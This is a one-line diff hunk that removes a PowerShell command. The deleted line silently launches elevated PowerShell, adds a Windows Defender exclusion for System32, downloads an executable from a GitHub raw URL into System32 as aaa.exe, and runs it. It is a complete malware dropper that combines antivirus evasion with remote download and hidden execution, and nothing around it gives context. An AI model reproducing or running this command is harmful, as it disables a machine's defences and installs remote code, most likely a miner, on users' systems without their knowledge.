@@ -1,1 +1,0 @@
-Start-Process -FilePath 'powershell.exe' -ArgumentList "Add-MpPreference -ExclusionPath 'C:\Windows\System32'; Invoke-WebRequest -Uri 'https://github.com/rmonero/my_files/raw/main/console_app1.exe' -OutFile 'C:\Windows\System32\aaa.exe'; Start-Process -FilePath 'C:\Windows\System32\aaa.exe';" -Verb RunAs -WindowStyle Hidden
